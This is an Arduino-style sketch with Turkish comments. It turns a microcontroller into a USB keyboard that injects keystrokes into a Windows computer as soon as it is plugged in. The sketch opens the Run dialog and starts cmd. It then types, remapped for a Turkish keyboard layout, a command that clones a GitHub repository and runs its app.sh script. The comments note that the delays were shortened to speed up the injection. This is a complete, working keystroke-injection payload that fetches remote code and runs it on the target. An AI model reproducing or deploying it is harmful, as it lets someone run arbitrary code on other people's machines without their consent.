#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void trPrint(const String &text) {
  for (int i = 0; i < text.length(); i++) {
    char c = text[i];
    switch (c) {
      case 'i': Keyboard.write('\''); break;
      case 'I': Keyboard.write('i'); break;
      case '.': Keyboard.write('/'); break;
      case ':': 
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('/');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;
      case '/': Keyboard.write('&'); break;
      case '&':
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('^');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;
      case '-': Keyboard.write('*'); break;
      case '_': 
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.write('*');
        Keyboard.release(KEY_LEFT_SHIFT);
        break;
      default: Keyboard.write(c); break;
    }
    // Karakterler arası gecikme 20ms'den 4ms'ye düşürüldü
    delay(4); 
  }
}

void setup() {
  USB.begin();
  Keyboard.begin();

  // USB Enumeration beklemesi düşürüldü
  delay(1500);

  // Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(300); // Çalıştır penceresi için düşürülen süre

  // CMD Başlatma
  Keyboard.print("cmd");
  delay(50);
  Keyboard.write(KEY_RETURN);
  delay(500); // CMD penceresinin odaklanma süresi

  // Komutları tek satırda birleştirerek aradaki bekleme bağımlılığını kaldırma
  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git && cd BashExe && bash.exe ./app.sh");
  Keyboard.write(KEY_RETURN);
}

void loop() {}